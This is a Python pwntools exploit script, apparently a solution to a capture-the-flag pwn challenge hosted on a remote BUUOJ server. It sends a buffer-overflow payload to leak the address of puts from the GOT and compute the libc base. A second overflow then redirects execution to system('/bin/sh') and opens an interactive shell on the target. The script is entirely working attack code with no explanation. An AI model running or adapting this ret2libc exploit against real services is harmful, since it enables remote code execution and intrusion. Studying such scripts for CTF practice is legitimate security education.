#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=0
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    info('pid -> {}'.format(pid))
    success('elfbase', ELFbase)
    if interruptPoint :
        success('interruptPoint', hex(interruptPoint+ELFbase))
    success('libcBase', libcBase)
    # gdb.attach(io, 'b * 0x804879e')
    raw_input('debug>')
local = 0
if local:
    io = process('./pwn')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('node2.buuoj.cn.wetolink.com', 28095)
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')

randombuf = '\x00'*7+'\xff'*5
if local:
    debug()
io.sendline(randombuf)
io.recvuntil('Correct\n')
padding = 'a' * 0xe7 + 'beef'
start = 0x80485a0
payload = padding + p32(elf.plt['puts']) + p32(start)
payload += p32(elf.got['puts'])
io.sendline(payload)
putsaddr = u64(io.recvuntil('\n', drop = True).ljust(8, '\x00'))
libcbase = putsaddr - libc.sym['puts']

success('libcbase', libcbase)
libc.address = libcbase
sys = libc.sym['system']
binsh = libc.search('/bin/sh').next()
success('system', sys)
success('binsh', binsh)

io.sendline(randombuf)
io.recvuntil('Correct\n')
payload = padding + p32(sys) + 'gogo' + p32(binsh)
io.sendline(payload)

io.interactive()
io.close()




